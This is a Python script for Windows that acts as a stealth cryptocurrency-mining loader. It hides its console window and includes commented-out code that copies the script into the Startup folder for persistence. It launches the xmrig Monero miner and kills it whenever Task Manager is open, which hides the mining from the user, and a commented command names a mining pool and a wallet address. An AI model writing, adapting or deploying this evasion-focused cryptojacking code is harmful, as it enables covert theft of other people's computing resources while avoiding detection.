import os
import shutil
import getpass
import subprocess
import time
import psutil
import win32gui, win32con

## HIDE ##
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)
##########

## Move to autostart path ##
#user = getpass.getuser()
#start_folder = os.path.join("C:\\Users", user, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
#file = os.path.basename(__file__)
#path = os.path.join(os.getcwd(), file)
#autostart_path = os.path.join(start_folder, file)

#if not os.path.exists(autostart_path):
#    shutil.move(path, autostart_path)

############################

while True:
    #Check if TaskManager is already running
    taskmgr_running = False
    for proc in psutil.process_iter():
        if "Taskmgr.exe" in proc.name():
            taskmgr_running = True
            break

    if taskmgr_running:
        print('Task Manager is running')
        cmd = "taskkill /im xmrig.exe /f"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    else:
        #If TaskManager is not running
        # Check if Firefox is already running
        firefox_running = False
        for proc in psutil.process_iter():
            if "xmrig.exe" in proc.name():
                firefox_running = True
                break

        if firefox_running:
            print("Xmrig is already running")
        else:
            # If Xmrig is not running, start Xmrig
            print("Starting Xmrig")
            #cmd = r'cd Documents\_Business\xmrig-6.19.0 && xmrig.exe -o xmrpool.eu:9999 -u 496pdJkBGYpGXbSxBzNPat8BUX5Ukqth2GHQWVnU3tfT47eWJQ6kZfHMAcqMUS3RPuT76ZJRPqNvgB8JVNzVWHEFFatTShJ -k --tls'  # Replace with your desired command
            #subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.Popen([r'C:\Users\User\Documents\_Business\xmrig-6.19.0\xmrig.exe']) #Marketplace path
            time.sleep(0.5)
            ###Main Part###

    # Wait for a few seconds before checking again
    time.sleep(1.5)

## Test ##

#shell:startup